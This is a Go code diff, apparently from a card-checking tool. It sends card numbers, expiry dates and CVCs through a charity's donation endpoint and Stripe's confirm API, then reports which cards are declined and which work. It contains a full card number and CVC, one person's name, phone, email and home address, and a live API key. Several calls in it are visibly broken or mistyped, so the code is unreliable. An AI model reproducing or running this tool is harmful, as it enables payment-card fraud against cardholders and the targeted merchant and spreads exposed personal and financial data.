@@ -45,6 +45,7 @@ func get_id() string {
 }
 
 func update_id(id string) string {
+        fmt.Println(id)
 	client := &http.Client{}
 	var data = strings.NewReader(`{"paymentIntentId":"pi_3KNdcxJAcVRgqCLO1dhvJpZh","account":"us","testMode":false,"data":{"metadata":{"designation":"general","donation_type":"One-Time","amount_without_fee":73,"utm_source":null,"utm_medium":null,"utm_campaign":null,"utm_content":null,"utm_term":null,"int_source":"yaqeeninstitute.org","int_campaign":"general","int_content":"main_nav_donate_button","payment_method":"cc"},"customer":"cus_L3lajozOIcucpi"}}`)
 	req, err := http.NewRequest("POST", "https://yaqeeninstitute.ca/api/v1/donate/stripe/update-payment-intent", data)
@@ -78,9 +79,9 @@ func update_id(id string) string {
 	return m["clientSecret"]
 }
 
-func confirm(id string) string {
+func confirm(id string, cc string, month string, year string, cvc string) (string, string, string) {
 	client := &http.Client{}
-	var data = strings.NewReader(`receipt_email=devnull%40yaqeeninstitute.org&payment_method_data[type]=card&payment_method_data[metadata][designation]=general&payment_method_data[metadata][donation_type]=One-Time&payment_method_data[metadata][amount_without_fee]=73&payment_method_data[metadata][int_source]=yaqeeninstitute.org&payment_method_data[metadata][int_campaign]=general&payment_method_data[metadata][int_content]=main_nav_donate_button&payment_method_data[metadata][payment_method]=cc&payment_method_data[billing_details][name]=Jenna+M+Ortega&payment_method_data[billing_details][phone]=%2B1+9402197942&payment_method_data[billing_details][email]=amarnathc%40outlook.in&payment_method_data[billing_details][address][line1]=394+Olen+Thomas+Drive&payment_method_data[billing_details][address][line2]=&payment_method_data[billing_details][address][city]=Crowell&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][postal_code]=79227&payment_method_data[billing_details][address][state]=TX&payment_method_data[card][number]=4430440035807783&payment_method_data[card][cvc]=215&payment_method_data[card][exp_month]=08&payment_method_data[card][exp_year]=26&payment_method_data[guid]=73f5a9dc-4f9d-4102-9f39-112d2bc87189f08893&payment_method_data[muid]=c2fe2add-ecb3-4320-915b-a926ca22c4a498e15e&payment_method_data[sid]=6c0ab791-b55b-4969-b556-9aca59adccd76700f0&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F7050ff317%3B+stripe-js-v3%2F7050ff317&payment_method_data[time_on_page]=1967550&expected_payment_method_type=card&use_stripe_sdk=true&webauthn_uvpa_available=false&spc_eligible=false&key=pk_live_tGDwiUeDEcgPGTyb51bqDNG8&client_secret=` + update_id(id))
+	var data = strings.NewReader(`receipt_email=devnull%40yaqeeninstitute.org&payment_method_data[type]=card&payment_method_data[metadata][designation]=general&payment_method_data[metadata][donation_type]=One-Time&payment_method_data[metadata][amount_without_fee]=73&payment_method_data[metadata][int_source]=yaqeeninstitute.org&payment_method_data[metadata][int_campaign]=general&payment_method_data[metadata][int_content]=main_nav_donate_button&payment_method_data[metadata][payment_method]=cc&payment_method_data[billing_details][name]=Jenna+M+Ortega&payment_method_data[billing_details][phone]=%2B1+9402197942&payment_method_data[billing_details][email]=amarnathc%40outlook.in&payment_method_data[billing_details][address][line1]=394+Olen+Thomas+Drive&payment_method_data[billing_details][address][line2]=&payment_method_data[billing_details][address][city]=Crowell&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][postal_code]=79227&payment_method_data[billing_details][address][state]=TX&payment_method_data[card][number]=`+ cc + `&payment_method_data[card][cvc]=`+ cvc + `&payment_method_data[card][exp_month]=`+ month + `&payment_method_data[card][exp_year]=`+ year + `&payment_method_data[guid]=73f5a9dc-4f9d-4102-9f39-112d2bc87189f08893&payment_method_data[muid]=c2fe2add-ecb3-4320-915b-a926ca22c4a498e15e&payment_method_data[sid]=6c0ab791-b55b-4969-b556-9aca59adccd76700f0&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F7050ff317%3B+stripe-js-v3%2F7050ff317&payment_method_data[time_on_page]=1967550&expected_payment_method_type=card&use_stripe_sdk=true&webauthn_uvpa_available=false&spc_eligible=false&key=pk_live_tGDwiUeDEcgPGTyb51bqDNG8&client_secret=` + update_id(id))
 	req, err := http.NewRequest("POST", "https://api.stripe.com/v1/payment_intents/pi_3KNdcxJAcVRgqCLO1dhvJpZh/confirm", data)
 	if err != nil {
 		log.Fatal(err)
@@ -103,15 +104,34 @@ func confirm(id string) string {
 		log.Fatal(err)
 	}
 	defer resp.Body.Close()
-	bodyText, err := ioutil.ReadAll(resp.Body)
+	var x mapType
+        json.NewDecoded(resp.Body).Decode(&x)
 	if err != nil {
 		log.Fatal(err)
 	}
-	return string(bodyText)
+        code, dcode, msg := "", "", ""
+        if e, ok := x["error"] ; ok {
+           e := e.(map[string]interface{})
+           if c, ok := e["code"] ; ok {
+               code = c.(string)
+}
+if d, on := e["decline_code"] ; ok {
+dcode = d.(string)
+}
+if m, ok := e["message"] ; ok {
+msg = m.(string)
+}
+}
+	return code, dcode, msg
 }
 
-func StripeRs() string {
+func StripeRs(cc string, month string, year string, cvc string) string {
 	id := get_id()
-	cd := confirm(id)
-	return cd[:500]
+	code, dcode, msg := confirm(id)
+emoji := "❌"
+        if code != "card_declined"{
+emoji = "✅"
+}
+	F := fmt.Sprinf(stripe_rs, cc, month, year, cvc, strings.ToUpper(code), emoji, dcode, msg, ".", "Free User")
+        return F
 }
